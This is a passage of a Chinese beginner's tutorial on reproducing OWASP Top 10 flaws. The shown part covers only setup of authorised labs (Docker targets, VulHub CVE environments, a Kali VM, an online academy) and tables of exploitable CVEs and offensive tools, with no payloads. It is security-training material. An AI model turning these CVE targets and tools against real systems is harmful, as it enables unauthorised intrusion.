# OWASP Top 10 零基础漏洞复现教程（完整整合版）

**文档版本**：v3.0 整合版  
**最后更新**：2026年3月  
**适用人群**：零基础网络安全学习者  

---

## ⚠️ 法律声明

> **重要提示**：本教程所有操作必须在**授权的靶场环境**中进行！
>
> 未经许可对真实系统进行渗透测试，将违反《中华人民共和国网络安全法》第27条、第63条，以及《刑法》第285条、第286条，可能面临刑事处罚。
>
> **仅限学习目的，严禁用于非法用途！**

---

## 目录

1. [环境搭建方案选择指南](#第一部分环境搭建方案选择指南)
2. [四种环境搭建详细步骤](#第二部分四种环境搭建详细步骤)
3. [必备工具超详细安装指南](#第三部分必备工具超详细安装指南)
4. [OWASP Top 10 漏洞详细复现](#第四部分owasp-top-10-漏洞详细复现)
5. [综合实战场景](#第五部分综合实战场景)
6. [常见问题解决](#第六部分常见问题解决)
7. [学习资源与进阶路径](#附录学习资源与进阶路径)

---

## 第一部分：环境搭建方案选择指南

### 为什么需要多种环境搭建方案？

**痛点分析**：
- 硬件配置不同（内存8GB vs 32GB）
- 操作系统不同（Windows、macOS、Linux）
- 网络环境不同（国内访问慢、公司内网限制）
- 学习阶段不同（入门 vs 进阶 vs 职业准备）
- 使用场景不同（本地练习 vs 随时随地学习）

**单一方案的局限性**：
- Kali虚拟机对硬件要求高，低配电脑跑不动
- Docker方案需要一定的技术门槛
- 纯在线靶场需要稳定的网络连接
- VulHub适合进阶，但新手可能难以入手

### 四种方案对比总览

| 方案 | 难度 | 部署时间 | 空间需求 | 网络要求 | 适用人群 | 核心优势 |
|------|------|----------|----------|----------|---------|---------|
| **方案1：Docker 本地一键部署** | ⭐ | 10分钟 | 500MB-2GB | 初始下载需联网 | 零基础新手、快速上手 | 资源占用少、部署快、隔离性好 |
| **方案2：VulHub 专业靶场** | ⭐⭐ | 30分钟 | 2GB-5GB | 初始下载需联网 | 有一定基础、学习真实漏洞 | 300+真实漏洞环境、贴近实战 |
| **方案3：Kali Linux 虚拟机** | ⭐⭐⭐ | 1-2小时 | 40GB+ | 初始下载需联网 | 深度学习者、职业发展 | 集成600+工具、完整渗透环境 |
| **方案4：PortSwigger 在线靶场** | ⭐ | 5分钟 | 0MB | 全程需联网 | 随时随地学习、碎片化时间 | 160+免费实验室、进度跟踪、证书 |

### 快速选择决策树

```
您的配置如何？
├─ 内存 ≤ 8GB，硬盘 ≤ 100GB
│  └─ 选择：方案1（Docker）+ 方案4（在线靶场）
│
├─ 内存 8-16GB，硬盘 100-200GB
│  ├─ 零基础 → 方案1（Docker）+ 方案4（在线靶场）
│  └─ 有基础 → 方案2（VulHub）+ 方案4（在线靶场）
│
└─ 内存 ≥ 16GB，硬盘 ≥ 200GB
   ├─ 准备考证/职业发展 → 方案3（Kali）+ 方案2（VulHub）
   └─ 纯学习兴趣 → 方案2（VulHub）+ 方案4（在线靶场）
```

### 推荐组合方案

**组合1：零基础快速入门（最推荐）**
- **方案1 + 方案4**
- **部署时间**：15分钟
- **资源占用**：约2GB
- **适用场景**：快速建立学习信心，了解漏洞原理
- **学习周期**：1-2个月

**组合2：进阶系统学习**
- **方案2 + 方案4**
- **部署时间**：35分钟
- **资源占用**：约5GB
- **适用场景**：系统掌握各类漏洞，准备参加CTF
- **学习周期**：3-6个月

**组合3：专业职业准备**
- **方案3 + 方案2 + 方案4**
- **部署时间**：2-3小时
- **资源占用**：约50GB
- **适用场景**：准备CEH、OSCP认证，求职准备
- **学习周期**：6-12个月

**组合4：轻量级随时随地学习**
- **方案4 为主**，配合方案1部署1-2个简单靶场
- **部署时间**：10分钟
- **资源占用**：约1GB
- **适用场景**：时间碎片化，没有固定电脑
- **学习周期**：长期持续学习

### 方案切换与迁移

**从方案1升级到方案2**：
```bash
# Docker已在方案1安装，直接克隆VulHub
git clone https://github.com/vulhub/vulhub.git
cd vulhub
# 启动任意漏洞环境
cd struts2/s2-001
docker-compose up -d
```

**从方案1/2升级到方案3**：
- 保留Docker环境，在Kali中继续使用
- Kali中已集成大部分渗透工具
- 可将Docker容器迁移到Kali中运行

**多环境共存**：
- 方案1的Docker容器可在Windows/Mac/Linux间无缝迁移
- 方案4在线靶场无需迁移，账号通用
- 方案2和3可同时运行，互不干扰

---

## 第二部分：四种环境搭建详细步骤

### 方案1：Docker 本地一键部署（推荐新手）

#### 1.1 什么是 Docker？

**通俗解释**：Docker 就像一个"轻量级虚拟机"。传统虚拟机需要安装完整操作系统，占用几GB空间；而 Docker 只打包应用程序和依赖，几十MB就能运行。就像传统手机和智能手机的区别。

**核心概念**：
- **镜像（Image）**：应用程序的模板（如DVWA镜像、Nginx镜像）
- **容器（Container）**：镜像的运行实例（可以同时运行多个相同镜像的容器）
- **仓库（Registry）**：存储镜像的地方（Docker Hub）

**为什么要用 Docker**：
- **快速部署**：几秒钟启动漏洞环境
- **环境隔离**：不影响系统安全
- **资源占用少**：比虚拟机节省90%空间
- **易于管理**：一键启动、停止、删除

#### 1.2 安装 Docker（跨平台）

##### Windows/Mac 安装

**步骤1：下载 Docker Desktop**
- 访问：https://www.docker.com/products/docker-desktop
- 下载对应操作系统版本（.exe 或 .dmg）

**步骤2：安装**
- 双击安装程序
- 一路点击"Next"或"继续"
- 安装完成后重启电脑

**步骤3：验证安装**
- Windows：任务栏看到 Docker 图标，显示"Running"
- Mac：菜单栏看到 Docker 图标
- 打开终端/命令提示符，运行：
```bash
docker --version
docker run hello-world
```

##### Linux (Ubuntu/Kali) 安装

**步骤1：更新系统**
```bash
sudo apt update
sudo apt upgrade -y
```

**步骤2：安装 Docker**
```bash
# Ubuntu/Debian/Kali
sudo apt install docker.io -y

# 启动 Docker 服务
sudo systemctl start docker

# 设置开机自启动
sudo systemctl enable docker
```

**步骤3：将当前用户加入 docker 组**
```bash
# 将用户加入docker组（避免每次都用sudo）
sudo usermod -aG docker $USER

# 刷新用户组
newgrp docker

# 验证（现在不需要sudo）
docker --version
docker run hello-world
```

#### 1.3 配置国内镜像加速（必须步骤）

**为什么需要**：Docker 官方镜像库在国外，下载速度极慢（可能几KB/s），配置国内镜像可提速到几MB/s。

##### Windows/Mac（Docker Desktop）

1. 右键任务栏 Docker 图标 → "Settings"
2. 选择 "Docker Engine"
3. 在配置JSON中添加：
```json
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://dockerproxy.com",
    "https://docker.mirrors.ustc.edu.cn",
    "https://docker.nju.edu.cn"
  ]
}
```
4. 点击 "Apply & Restart"
5. 等待Docker重启完成

##### Linux

```bash
# 创建 Docker 配置目录
sudo mkdir -p /etc/docker

# 配置镜像加速
sudo tee /etc/docker/daemon.json <<-'EOF'
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://dockerproxy.com",
    "https://docker.mirrors.ustc.edu.cn",
    "https://docker.nju.edu.cn"
  ]
}
EOF

# 重启 Docker 服务
sudo systemctl daemon-reload
sudo systemctl restart docker

# 验证配置
docker info | grep -A 10 "Registry Mirrors"
```

#### 1.4 一键部署常用靶场

##### DVWA（Web漏洞基础靶场）

```bash
# 拉取 DVWA 镜像
docker pull vulnerables/web-dvwa

# 启动容器（映射端口8081）
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa

# 查看运行状态
docker ps

# 访问：http://localhost:8081
# 默认账号：admin/password
```

**参数解释**：
- `-d`：后台运行（detached mode）
- `-p 8081:80`：端口映射（主机8081端口 → 容器80端口）
- `--name dvwa`：给容器命名，方便管理
- `vulnerables/web-dvwa`：镜像名称

##### WebGoat（OWASP官方靶场）

```bash
# 拉取镜像
docker pull webgoat/webgoat

# 启动容器（映射端口8080和9090）
docker run -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 \
  -e TZ=Asia/Shanghai \
  --name webgoat \
  webgoat/webgoat

# 访问：http://localhost:8080/WebGoat
# 默认账号：guest/guest
```

**注意**：WebGoat 使用 8080 端口，不会与其他靶场冲突。

##### OWASP Juice Shop（现代Web漏洞靶场）

```bash
# 拉取镜像
docker pull bkimminich/juice-shop

# 启动容器（映射端口8082）
docker run -d -p 8082:3000 --name juice-shop bkimminich/juice-shop

# 访问：http://localhost:8082
```

**特点**：包含现代Web应用的所有常见漏洞，界面美观，难度渐进。

##### SQLi-Labs（SQL注入专项靶场）

```bash
# 拉取镜像
docker pull acgpiano/sqli-labs

# 启动容器（映射端口8083）
docker run -d -p 8083:80 --name sqli-labs acgpiano/sqli-labs

# 访问：http://localhost:8083
```

**特点**：专门练习SQL注入，包含从基础到高级的所有SQL注入类型。

#### 1.5 端口映射规划与管理

⚠️ **重要提示**：多个容器不能同时映射到同一个主机端口，否则会导致端口冲突。

##### 端口冲突问题说明

如果两个容器都映射到主机的8080端口，第二个容器启动会失败：

```bash
# 容器1
docker run -d -p 8080:8080 --name webgoat webgoat/webgoat
# ✓ 成功启动

# 容器2（会失败！）
docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa
# ✗ 错误：Error starting userland proxy: listen tcp4 0.0.0.0:8080: bind: address already in use
```

**原因**：主机8080端口已被第一个容器占用。

##### 推荐端口规划方案

为避免端口冲突，建议按以下规则分配主机端口：

| 应用 | 容器端口 | 主机端口 | 访问地址 |
|------|---------|---------|---------|
| WebGoat | 8080 | 8080 | http://IP:8080/WebGoat |
| DVWA | 80 | 8081 | http://IP:8081 |
| OWASP Juice Shop | 3000 | 8082 | http://IP:8082 |
| SQLi-Labs | 80 | 8083 | http://IP:8083 |
| Nginx（测试用） | 80 | 8084 | http://IP:8084 |

##### 正确的启动方式

```bash
# WebGoat 使用 8080
docker run -d -p 8080:8080 --name webgoat webgoat/webgoat

# DVWA 使用 8081
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa

# OWASP Juice Shop 使用 8082
docker run -d -p 8082:3000 --name juice-shop bkimminich/juice-shop

# SQLi-Labs 使用 8083
docker run -d -p 8083:80 --name sqli-labs acgpiano/sqli-labs
```

##### 端口映射格式说明

```bash
docker run -d -p 主机端口:容器端口 --name 容器名 镜像名
            ↑         ↑
            |         |
      浏览器访问的端口  容器内部监听的端口
```

**示例**：
```bash
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa
#            ↑  ↑
#            |  |
#      访问:8081   DVWA容器内监听80端口
```

##### 查看端口占用情况

```bash
# 查看所有容器的端口映射
docker ps

# 输出示例：
# CONTAINER ID   IMAGE                    STATUS          PORTS
# abc123         webgoat/webgoat          Up 5 minutes    0.0.0.0:8080->8080/tcp
# def456         vulnerables/web-dvwa     Up 5 minutes    0.0.0.0:8081->80/tcp
# ghi789         bkimminich/juice-shop    Up 5 minutes    0.0.0.0:8082->3000/tcp

# 查看主机端口占用
sudo netstat -tulnp | grep -E '8080|8081|8082'

# 或使用 ss 命令
sudo ss -tulnp | grep -E '8080|8081|8082'
```

##### 批量启动脚本（推荐）

创建一个脚本一次性启动所有容器，自动分配端口：

```bash
cat > start_all_targets.sh << 'EOF'
#!/bin/bash

echo "=== 启动所有漏洞环境 ==="
echo ""

# 1. WebGoat (端口 8080)
echo "【1】启动 WebGoat (端口 8080)..."
docker run -d \
  --name webgoat \
  -p 8080:8080 \
  webgoat/webgoat

# 2. DVWA (端口 8081)
echo "【2】启动 DVWA (端口 8081)..."
docker run -d \
  --name dvwa \
  -p 8081:80 \
  vulnerables/web-dvwa

# 3. OWASP Juice Shop (端口 8082)
echo "【3】启动 OWASP Juice Shop (端口 8082)..."
docker run -d \
  --name juice-shop \
  -p 8082:3000 \
  bkimminich/juice-shop

# 4. SQLi-Labs (端口 8083)
echo "【4】启动 SQLi-Labs (端口 8083)..."
docker run -d \
  --name sqli-labs \
  -p 8083:80 \
  acgpiano/sqli-labs

echo ""
echo "=== 启动完成！==="
echo ""
echo "访问地址："
echo "  WebGoat:      http://$(hostname -I | awk '{print $1}'):8080/WebGoat"
echo "  DVWA:         http://$(hostname -I | awk '{print $1}'):8081"
echo "  OWASP Juice Shop: http://$(hostname -I | awk '{print $1}'):8082"
echo "  SQLi-Labs:    http://$(hostname -I | awk '{print $1}'):8083"
echo ""
echo "查看运行状态：docker ps"
EOF

chmod +x start_all_targets.sh
./start_all_targets.sh
```

##### 停止所有容器

```bash
# 停止并删除所有靶场容器
docker stop webgoat dvwa juice-shop sqli-labs 2>/dev/null
docker rm webgoat dvwa juice-shop sqli-labs 2>/dev/null

# 或者使用脚本
cat > stop_all_targets.sh << 'EOF'
#!/bin/bash

echo "=== 停止所有靶场容器 ==="
docker stop webgoat dvwa juice-shop sqli-labs 2>/dev/null
docker rm webgoat dvwa juice-shop sqli-labs 2>/dev/null

echo "=== 清理完成 ==="
echo ""
docker ps
EOF

chmod +x stop_all_targets.sh
./stop_all_targets.sh
```

##### 查看所有靶场访问地址

```bash
cat > show_targets.sh << 'EOF'
#!/bin/bash

echo "=== 漏洞靶场访问地址 ==="
echo ""

IP=$(hostname -I | awk '{print $1}')

echo "【OWASP 系列】"
echo "  WebGoat:      http://${IP}:8080/WebGoat"
echo "  DVWA:         http://${IP}:8081"
echo "  Juice Shop:   http://${IP}:8082"

echo ""
echo "【SQL注入靶场】"
echo "  SQLi-Labs:    http://${IP}:8083"

echo ""
echo "【运行中的容器】"
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"

echo ""
echo "查看详情：docker ps"
echo "停止容器：docker stop <容器名>"
EOF

chmod +x show_targets.sh
./show_targets.sh
```

#### 1.6 Docker 常用命令速查表

| 命令 | 作用 | 示例 |
|------|------|------|
| `docker pull <镜像名>` | 拉取镜像 | `docker pull vulnerables/web-dvwa` |
| `docker images` | 查看本地镜像 | `docker images` |
| `docker run [参数] <镜像名>` | 运行容器 | `docker run -d -p 80:80 nginx` |
| `docker ps` | 查看运行中的容器 | `docker ps` |
| `docker ps -a` | 查看所有容器 | `docker ps -a` |
| `docker stop <容器ID/名称>` | 停止容器 | `docker stop dvwa` |
| `docker start <容器ID/名称>` | 启动容器 | `docker start dvwa` |
| `docker rm <容器ID/名称>` | 删除容器 | `docker rm dvwa` |
| `docker logs <容器ID/名称>` | 查看容器日志 | `docker logs dvwa` |
| `docker exec -it <容器ID/名称> /bin/bash` | 进入容器内部 | `docker exec -it dvwa /bin/bash` |
| `docker stats` | 查看容器资源占用 | `docker stats` |

#### 1.6 常见问题解决

**问题1：端口冲突**

现象：
```
docker: Error response from daemon: driver failed programming external connectivity on endpoint dvwa (xxx): Bind for 0.0.0.0:8080 failed: port is already allocated.
```

原因：8080端口已被其他程序占用

解决：
```bash
# 方法1：查看端口占用
netstat -tulnp | grep 8080  # Linux
netstat -ano | findstr :8080  # Windows

# 方法2：修改端口映射
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa
# 访问：http://localhost:8081
```

**问题2：权限不足（Linux）**

现象：
```
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock
```

解决：
```bash
# 将用户加入docker组
sudo usermod -aG docker $USER
newgrp docker  # 立即生效，或重新登录
```

**问题3：镜像拉取失败**

现象：
```
Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled
```

解决：
```bash
# 1. 检查网络连接
ping www.baidu.com

# 2. 检查镜像加速器配置
cat /etc/docker/daemon.json  # Linux
# 或检查 Docker Desktop 设置（Windows/Mac）

# 3. 重启Docker服务
sudo systemctl restart docker  # Linux
# 或重启 Docker Desktop（Windows/Mac）

# 4. 使用代理（如果在国内）
export http_proxy=http://proxy:port
export https_proxy=http://proxy:port
docker pull vulnerables/web-dvwa
```

**问题4：容器启动失败**

```bash
# 查看详细错误日志
docker logs dvwa

# 常见原因：
# 1. 端口被占用 → 修改端口
# 2. 资源不足 → 增加内存/CPU
# 3. 镜像损坏 → 重新拉取镜像
```

#### 1.7 方案1总结

**优点**：
✅ 5-10分钟快速上手
✅ 资源占用极小（500MB-2GB）
✅ 易于管理和切换
✅ 适合零基础新手
✅ 跨平台兼容

**缺点**：
❌ 需要了解基本的Docker命令
❌ 某些复杂漏洞环境可能需要额外配置
❌ 不如Kali环境完整（缺少部分渗透工具）

**适用场景**：
- 零基础快速入门
- 硬件配置有限的电脑
- Windows/Mac用户不想安装虚拟机
- 快速测试特定漏洞环境

---

### 方案2：VulHub 专业漏洞靶场（推荐进阶）

#### 2.1 什么是 VulHub？

**通俗解释**：VulHub 是一个"漏洞环境超市"，包含300+真实漏洞的现成环境，从经典的Log4j2到最新的Spring漏洞，只需一条命令就能启动完整的漏洞环境。

**核心优势**：
- **漏洞覆盖全**：300+ 漏洞环境，涵盖 Web、中间件、数据库、框架等
- **真实场景**：每个漏洞都是真实 CVE 复现，贴近实战
- **一键启动**：每个漏洞环境只需 2 条命令
- **学习路径清晰**：每个漏洞都有详细复现说明
- **社区活跃**：问题容易找到答案
- **持续更新**：及时跟进最新漏洞

**适合人群**：
- 已掌握基本漏洞原理
- 想系统练习真实漏洞复现
- 准备参加 CTF 竞赛
- 准备考取渗透测试认证（如 OSCP）

#### 2.2 安装准备

**环境要求**：
- Docker 和 Docker Compose（方案1已安装可跳过）
- Git（用于克隆仓库）
- 至少 2GB 内存，推荐 4GB+
- 10GB 可用磁盘空间

**安装 Docker Compose**

**Linux（Ubuntu/Debian/Kali）**：
```bash
# 方法1：使用 apt 安装
sudo apt update
sudo apt install docker-compose -y

# 验证安装
docker-compose --version
```

**Windows/Mac**：
- Docker Desktop 已包含 Docker Compose，无需单独安装

#### 2.3 安装 VulHub

```bash
# 使用官方仓库（可能较慢）
git clone --depth 1 https://github.com/vulhub/vulhub.git

# 或使用国内镜像（推荐）
git clone --depth 1 https://gitee.com/pentest/vulhub.git

# 进入目录
cd vulhub

# 查看目录结构
ls
```

**目录结构说明**：
```
vulhub/
├── web/              # Web 漏洞（Struts2、ThinkPHP、Spring 等）
├── cms/              # CMS 漏洞（WordPress、Discuz、Drupal 等）
├── middleware/       # 中间件漏洞（WebLogic、Tomcat 等）
├── database/         # 数据库漏洞（Redis、MongoDB 等）
├── framework/        # 框架漏洞（Laravel、Django 等）
├── app/              # 应用漏洞
└── README.md         # 使用说明
```

**参数解释**：
- `--depth 1`：只下载最新版本，节省空间和时间

#### 2.4 使用方法（以Log4j2漏洞为例）

**步骤1：进入漏洞目录**
```bash
cd vulhub/log4j2/CVE-2021-44228
```

**步骤2：查看README**
```bash
cat README.md
```
README中包含漏洞信息、复现步骤、影响版本等。

**步骤3：启动环境**
```bash
# 启动环境（首次启动会下载镜像，需耐心等待）
docker-compose up -d

# 查看环境状态
docker-compose ps
```

**输出示例**：
```
NAME                     COMMAND              STATE   PORTS
--------------------------------------------------------------
log4j2_cve-2021-44228_solr_1   "docker-entrypoint.s…"   Up      0.0.0.0:8983->8983/tcp
```

**步骤4：访问漏洞环境**
1. 查看端口映射：`docker-compose ps`
2. 浏览器访问：http://localhost:8983
3. 确认 Solr 服务正常运行

**步骤5：复现漏洞**
根据 README 中的复现步骤进行测试。

**步骤6：测试完清理环境**
```bash
# 停止并删除容器（保留数据卷）
docker-compose down

# 停止并删除容器、镜像、数据卷（彻底清理）
docker-compose down -v --rmi all

# 清理所有未使用的资源
docker system prune -a
```

#### 2.5 常用漏洞环境列表（按难度排序）

##### ⭐ 初级（新手入门）

| 漏洞名称 | 路径 | 难度 | 学习重点 |
|---------|------|------|---------|
| Struts2 S2-001 | `struts2/s2-001` | ⭐ | 基础 OGNL 注入 |
| ThinkPHP 5.0.23 | `thinkphp/5.0.23-rce` | ⭐ | 远程代码执行 |
| Discuz 7.x 代码执行 | `discuz/wooyun-2010-080723` | ⭐ | CMS 漏洞 |
| PHPMyAdmin 4.8.1 | `phpmyadmin/CVE-2018-12613` | ⭐ | 文件包含 |
| Redis 未授权访问 | `redis/4-unacc` | ⭐ | 中间件漏洞 |

##### ⭐⭐ 中级（进阶学习）

| 漏洞名称 | 路径 | 难度 | 学习重点 |
|---------|------|------|---------|
| Log4j2 RCE | `log4j2/CVE-2021-44228` | ⭐⭐ | JNDI 注入 |
| WebLogic T3 | `weblogic/CVE-2015-4852` | ⭐⭐ | 反序列化 |
| Spring Cloud | `spring/CVE-2022-22947` | ⭐⭐ | SpEL 注入 |
| Shiro 550 | `shiro/CVE-2016-4437` | ⭐⭐ | Shiro RememberMe |
| Jenkins | `jenkins/CVE-2017-1000353` | ⭐⭐ | 反序列化 |

##### ⭐⭐⭐ 高级（挑战提升）

| 漏洞名称 | 路径 | 难度 | 学习重点 |
|---------|------|------|---------|
| Apache Solr | `solr/CVE-2019-0193` | ⭐⭐⭐ | SSRF |
| Jboss EAP | `jboss/CVE-2017-12149` | ⭐⭐⭐ | JMXInvokerServlet |
| Nginx 配置错误 | `nginx/insecure-configuration` | ⭐⭐⭐ | 目录穿越 |
| Fastjson 反序列化 | `fastjson/1.2.24-rce` | ⭐⭐⭐ | 反序列化链构造 |

#### 2.6 VulHub 常见问题

**问题1：docker-compose 命令不存在**

```bash
# Linux 用户安装
sudo apt install docker-compose -y

# 或升级到最新版本
sudo apt install docker-compose-plugin -y
# 使用 docker compose（注意空格）代替 docker-compose
```

**问题2：启动环境时报错**
```bash
# 查看详细错误日志
docker-compose logs

# 常见原因：端口冲突，修改docker-compose.yml中的端口映射
# 编辑 docker-compose.yml
nano docker-compose.yml
# 修改 ports 字段
# 然后重新启动
docker-compose down
docker-compose up -d
```

**问题3：环境启动后无法访问**
```bash
# 检查容器状态
docker-compose ps

# 检查端口映射
sudo netstat -tulnp | grep 8983  # Linux
netstat -ano | findstr :8983     # Windows

# 查看容器日志
docker-compose logs
```

**问题4：下载镜像速度慢**
```bash
# 确保已配置Docker镜像加速（同方案1中的配置）
cat /etc/docker/daemon.json  # Linux
```

#### 2.7 方案2总结

**优点**：
✅ 漏洞覆盖全面（300+）
✅ 每个漏洞都有详细文档
✅ 真实 CVE 复现
✅ 一键启动，易于切换
✅ 社区活跃，问题易解决
✅ 持续更新最新漏洞

**缺点**：
❌ 需要了解 Docker 和 Docker Compose
❌ 某些环境资源占用较大
❌ 需要手动清理环境
❌ 部分漏洞复现需要额外工具

**适用场景**：
- 已掌握基本漏洞原理
- 想系统学习真实漏洞
- 准备参加CTF竞赛
- 准备OSCP等认证
- 需要追踪最新漏洞

---

### 方案3：Kali Linux 虚拟机完整环境（专业学习环境）

#### 3.1 什么是 Kali Linux？

**通俗解释**：Kali Linux 就像一个"网络安全工具大礼包"，里面预装了600多种安全工具。就好比你买了一套装修工具箱，里面有锤子、电钻、扳手等各种工具，不用你再一个个去买了。

**核心特点**：
- **专业工具集成**：600+ 渗透测试工具预装
- **开源免费**：完全免费，社区活跃
- **持续更新**：定期更新工具和系统
- **多平台支持**：支持虚拟机、云服务器、ARM设备
- **定制灵活**：可以根据需求定制环境

**为什么要用 Kali Linux**：
- 集成了常用的渗透测试工具（Burp Suite、Nmap、Metasploit等）
- 开源免费
- 社区活跃，问题容易找到答案
- 考试必备环境（OSCP、CEH等）
- 适合深度学习和职业发展

#### 3.2 安装前准备

**硬件要求**：
- **内存**：至少 8GB（强烈推荐 16GB，否则会很卡）
- **硬盘空间**：至少 80GB（推荐 120GB+）
- **CPU**：支持虚拟化技术（现在电脑基本都支持）

**软件准备**：
- 虚拟机软件二选一：
  - **VMware Workstation Pro**（收费，但功能强大，性能好）
  - **Oracle VirtualBox**（免费，功能够用）

**下载步骤**（10分钟完成）：

1. 访问 Kali 官方网站：https://www.kali.org/get-kali/
2. 选择 **"Kali Linux 64-bit"**（推荐）
3. 下载镜像文件（ISO格式，大约 4GB）
   - 国内用户建议从清华大学镜像站下载，速度更快：
   - https://mirrors.tuna.tsinghua.edu.cn/kali-images/

#### 3.3 创建虚拟机（以VirtualBox为例）

##### 步骤1：新建虚拟机
1. 打开 VirtualBox
2. 点击左上角"新建"按钮
3. 填写信息：
   - **名称**：Kali-Linux（随意填写）
   - **类型**：Linux
   - **版本**：Other Linux (64-bit) 或 Debian (64-bit)
4. 点击"下一步"

##### 步骤2：分配内存
- **内存大小**：8192 MB（8GB）或 16384 MB（16GB）
- 注意：如果物理机只有16GB内存，建议分配8GB，否则物理机会卡
- 点击"下一步"

##### 步骤3：创建虚拟硬盘
1. 选择"现在创建虚拟硬盘"
2. 点击"创建"
3. 选择文件类型：**VDI (VirtualBox磁盘映像)**
4. 选择"动态分配"（更节省空间）
5. 设置大小：**120 GB**（最小80GB）
6. 选择保存位置（建议不要放在C盘）
7. 点击"创建"

##### 步骤4：加载镜像文件
1. 选中刚创建的虚拟机
2. 点击"设置"
3. 选择"存储"
4. 点击"控制器：IDE"下的"空"图标
5. 点击右侧的"光盘"图标，选择"选择磁盘文件"
6. 找到并选择下载的 Kali Linux ISO 文件
7. 点击"确定"

##### 步骤5：网络配置（重要！）
1. 在"设置"中选择"网络"
2. 网卡1连接方式选择：**桥接网卡**
   - **为什么选桥接**：让虚拟机和物理机在同一局域网，方便后续渗透测试
   - 如果物理机网络不稳定，可改用"NAT"模式
3. 点击"确定"

##### 步骤6：增强功能（可选，提升性能）
1. "设置" → "系统" → "加速"
2. 勾选"启用VT-x/AMD-V"
3. 勾选"启用嵌套分页"
4. 点击"确定"

#### 3.4 安装 Kali Linux（30分钟）

##### 启动虚拟机
1. 选中虚拟机，点击"启动"
2. 进入安装界面，选择 **"Graphical install"**（图形界面安装）

##### 跟着向导完成安装

**1. 语言选择**
- 推荐选择 **"English"**（避免中文乱码问题）
- 如果需要中文支持，选择"简体中文"

**2. 地区选择**
- 选择"China"

**3. 键盘布局**
- 选择"American English"（推荐）
- 或"Chinese"

**4. 主机名**
- 输入：`kali`（默认即可）

**5. 域名**
- 留空（直接回车）

**6. 用户设置**
- **全名**：kali
- **用户名**：kali
- **密码**：**设置一个强密码**（一定要记住！）

**7. 磁盘分区**
- 选择"使用整个磁盘"（新手选这个）
- 选择磁盘
- 分区方案：选择"将所有文件放在同一个分区"
- 选择"结束分区并写入更改"
- 输入"yes"确认

**8. 安装软件**
- 确保选中"图形桌面环境"
- 确保选中"标准系统工具"
- 其他可根据需要选择（如SSH服务器）

**9. 安装引导程序**
- 选择"Yes"，安装到 /dev/sda
- 选择设备：/dev/sda

**10. 完成安装**
- 重启系统

#### 3.5 安装后配置

##### 基础配置

**1. 更新系统**
```bash
sudo apt update
sudo apt upgrade -y
sudo apt dist-upgrade -y
```

**2. 安装额外工具**
```bash
# 安装 Python 3
sudo apt install python3 python3-pip -y

# 安装 Git
sudo apt install git -y

# 安装 Docker（如果在Kali中也要用Docker）
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker
sudo usermod -aG docker $USER
newgrp docker

# 配置Docker镜像加速
sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json <<-'EOF'
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://docker.mirrors.ustc.edu.cn"
  ]
}
EOF
sudo systemctl daemon-reload
sudo systemctl restart docker
```

**3. 安装 VulHub（如需要）**
```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub
```

##### 验证工具是否安装

```bash
# 检查常用工具
which burpsuite
which nmap
which msfconsole
which sqlmap
which hydra
which wireshark
```

如果都显示路径，说明工具已正确安装！

#### 3.6 Kali Linux 常用工具速查

| 工具名称 | 用途 | 启动命令 | 说明 |
|---------|------|---------|------|
| Nmap | 端口扫描 | `nmap` | 最流行的端口扫描工具 |
| Burp Suite | Web漏洞测试 | `burpsuite` | Web渗透测试必备 |
| SQLMap | SQL注入 | `sqlmap` | 自动化SQL注入工具 |
| Metasploit | 渗透测试框架 | `msfconsole` | 漏洞利用框架 |
| Wireshark | 流量分析 | `wireshark` | 网络抓包分析 |
| Hydra | 暴力破解 | `hydra` | 在线密码破解 |
| John | 密码破解 | `john` | 离线密码破解 |
| Aircrack-ng | 无线渗透 | `aircrack-ng` | WiFi渗透测试 |
| Gobuster | 目录扫描 | `gobuster` | Web目录枚举 |
| Nikto | Web漏洞扫描 | `nikto` | Web漏洞扫描器 |
| Netcat | 网络工具 | `nc` | 瑞士军刀级工具 |

#### 3.7 Kali Linux 常见问题

**问题1：虚拟机启动黑屏**

**原因**：显存不足或3D加速未启用

**解决**：
- 虚拟机 → 设置 → 显示 → 显存：128MB
- 启用 3D 加速
- 增加内存分配

**问题2：网络无法连接**

```bash
# 重启网络服务
sudo systemctl restart networking

# 或重启网络接口
sudo ip link set eth0 down
sudo ip link set eth0 up

# 或切换到 NAT 模式
# 虚拟机设置 → 网络 → NAT
```

**问题3：系统运行卡顿**

**解决**：
- 增加虚拟机内存（如果物理机允许）
- 在虚拟机设置中启用"硬件加速"
- 关闭不必要的后台程序
- 使用固态硬盘（SSD）

**问题4：更新系统时出现错误**

```bash
# 清理缓存
sudo apt clean
sudo apt autoclean

# 修复依赖
sudo apt --fix-broken install

# 重新更新
sudo apt update
sudo apt upgrade
```

**问题5：无法复制粘贴（主机到虚拟机）**

**原因**：增强功能未正确安装

**解决**：
- VirtualBox：设备 → 安装增强功能
- 按照向导安装完成后重启

#### 3.8 方案3总结

**优点**：
✅ 专业工具集成（600+ 工具）
✅ 完整渗透环境
✅ 适合深度学习
✅ 考试必备（OSCP、CEH）
✅ 可高度定制
✅ 更新及时

**缺点**：
❌ 安装时间长（1-2小时）
❌ 资源占用大（至少8GB内存）
❌ 学习曲线陡峭
❌ 需要定期更新
❌ 对硬件要求高

**适用场景**：
- 准备从事网络安全职业
- 想系统学习渗透测试
- 准备参加专业认证考试（OSCP、CEH）
- 需要深度定制环境
- 有充足硬件资源

---

### 方案4：PortSwigger Web Security Academy（在线靶场）

#### 4.1 什么是 PortSwigger Web Security Academy？

**通俗解释**：PortSwigger 是 Burp Suite 的开发商提供的免费在线学习平台，就像一个"网络安全在线课堂"，包含160+交互式实验室，从基础到高级覆盖所有Web安全漏洞。

**核心优势**：
- **完全免费**：160+ 实验室，100% 免费
- **无需安装**：打开浏览器就能使用
- **内容权威**：由《Web应用黑客手册》作者团队打造
